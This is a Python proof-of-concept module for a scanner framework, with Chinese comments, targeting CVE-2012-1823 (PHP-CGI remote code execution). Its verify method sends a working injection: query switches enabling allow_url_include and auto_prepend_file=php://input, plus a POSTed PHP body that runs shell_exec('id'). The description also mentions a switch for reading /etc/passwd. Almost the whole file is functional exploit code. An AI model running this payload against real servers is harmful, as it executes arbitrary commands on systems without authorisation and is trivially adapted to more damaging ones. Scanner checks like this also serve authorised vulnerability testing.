# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'PHP_0003'  # 平台漏洞编号，留空
    name = 'PHP-CGI 远程代码执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = 'Unknown'  # 漏洞公布时间
    desc = '''
        漏洞其实是在apache调用php解释器解释.php文件时，会将url参数传我给php解释器，
        如果在url后加传命令行开关（例如-s、-d 、-c或-d auto_prepend_file%3d/etc/passwd+-n）等参数时，会导致源代码泄露和任意代码执行。
    '''  # 漏洞描述
    ref = 'https://github.com/vulhub/vulhub/tree/master/php/CVE-2012-1823'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'CVE-2012-1823'  # cve编号
    product = 'PHP'  # 漏洞应用名称
    product_version = 'php < 5.3.12 or php < 5.4.2'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'b4cfa970-55d3-4ab5-b2dc-1bfbbedf9797'
    author = 'cscan'  # POC编写者
    create_date = '2018-04-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # http://0day5.com/archives/90/
            data = '''<?php echo shell_exec("id"); ?>'''
            request = requests.post(
                '{target}/index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input'.format(target=self.target), data=data)
            r = request.text

            if 'uid' in r and 'gid' in r and 'groups' in r:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
